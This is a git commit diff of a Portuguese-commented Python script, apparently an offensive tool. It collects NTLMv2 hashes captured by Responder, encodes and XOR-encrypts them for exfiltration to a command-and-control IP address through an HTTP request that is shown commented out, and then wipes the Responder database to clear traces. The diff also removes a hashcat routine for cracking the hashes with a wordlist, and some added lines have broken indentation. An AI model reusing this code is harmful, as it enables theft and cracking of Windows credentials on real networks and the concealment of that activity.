580b9d02ebd5b32aab5ea25333000d3c79ece503
eep0x10 <43595490+eep0x10@users.noreply.github.com>
2024-08-05 18:23:38 -0300

    Update automation.py

--- automation.py
+++ automation.py
@@ -14,27 +14,6 @@ def xor_encrypt(base64_string, key):
         encrypted_bytes.append(encrypted_byte)
     return bytes(encrypted_bytes)
 
-conteudo_arquivo = ""
-
-# Nome do arquivo a ser lido
-nome_arquivo = "/tmp/captured_mac.txt"
-
-# Lê o arquivo e armazena seu conteúdo em uma variável
-try:
-    with open(nome_arquivo, 'r') as f:
-        conteudo_arquivo = f.read()
-        if len(conteudo_arquivo) > 5:
-            print(f"[!] MAC Capturado: {conteudo_arquivo}")
-            print("[+] MAC Alterado! (macchanger)")
-        else:
-            print("[X] Nenhum MAC Encontrado...")
-            sys.exit(0)
-except FileNotFoundError:
-    print(f"[X] Erro: o arquivo '{nome_arquivo}' não foi encontrado.")
-    sys.exit(0)
-
-import time
-
 def get_eth0_ip():
     while True:
         try:
@@ -50,6 +29,22 @@ def get_eth0_ip():
         except subprocess.CalledProcessError:
             # Em caso de erro ao executar o comando, espera e tenta novamente
             time.sleep(1)
+
+# Lê e armazena o MAC Address Capturado a partir do arquivo /tmp/captured_mac.txt
+conteudo_arquivo = ""
+nome_arquivo = "/tmp/captured_mac.txt"
+try:
+    with open(nome_arquivo, 'r') as f:
+        conteudo_arquivo = f.read()
+        if len(conteudo_arquivo) > 5:
+            print(f"[!] MAC Capturado: {conteudo_arquivo}")
+            print("[+] MAC Alterado! (macchanger)")
+        else:
+            print("[X] Nenhum MAC Encontrado...")
+            sys.exit(0)
+except FileNotFoundError:
+    print(f"[X] Erro: o arquivo '{nome_arquivo}' não foi encontrado.")
+    sys.exit(0)
 
 print("[+] Aguardando definir o ip...")
 
@@ -75,7 +70,10 @@ while True:
     if len(lista_filtrada) >= 10:
         print("[+] Salvando hashes coletados no arquivo:",nome_arquivo)
         os.system("cp DumpNTLMv2.txt "+nome_arquivo)
-        print("[+] Exfiltrando hashes via HTTP")
+
+	    
+	# Exfiltrar para C2    
+	print("[+] Exfiltrando hashes via HTTP")
         lista_hashes=""
         # Lista -> Base64
         for hashes in lista_filtrada: lista_hashes+=hashes+","
@@ -87,8 +85,10 @@ while True:
         decoded_bytes = base64.b64decode(b)
         # Criptografar usando XOR
         encrypted_bytes = xor_encrypt(decoded_bytes, key)
-
         #requests.get("http://69.55.55.7:3031/"+str(b))
+
+
+	    
         print("[+] Limpando database Responder")
         os.system("echo '' > DumpNTLMv2.txt && echo '' > DumpNTLMv1.txt")
         os.system("rm /usr/share/responder/Responder.db")
@@ -99,40 +99,3 @@ while True:
     time.sleep(10)
 
         
-
-    #sudo john --show hashes-2024-06-28-11-25-10.txt
-
-
-    # https://medium.com/@ekiser_48014/python-penetration-testing-using-hashcat-and-python-to-crack-windows-passwords-34cb4f052bf3
-
-    # Tool that simplifies the Hashcat cracking process.
-    '''
-    print("[+] Iniciando quebra de Hashes com hashcat + rockyou...")
-    import subprocess
-
-    # Prompt for type of hash
-    hash_type = 5600
-
-    # Prompt for location of hash file
-    hash_file = "/usr/share/responder/"+nome_arquivo
-
-    # Prompt for location to save findings
-    output_file = "/usr/share/responder/cracked-"+nome_arquivo
-
-    # Prompt for location of word list file
-    word_list_file = "/usr/share/wordlists/rockyou.txt"
-
-    # Define hashcat command with multithreading option
-    hashcat_command = f"hashcat -m {hash_type} -a 0 {hash_file} {word_list_file} --potfile-disable --remove --outfile {output_file} 2>&-"
-
-    # Execute hashcat command using subprocess
-    try:
-        print("[+] Hashcat Iniciado:",hashcat_command)
-        output = subprocess.check_output(hashcat_command, shell=True)
-    except Exception as e:
-        print("[!] Hashcat finalizado:",e)'''
-
-
-
-
-		
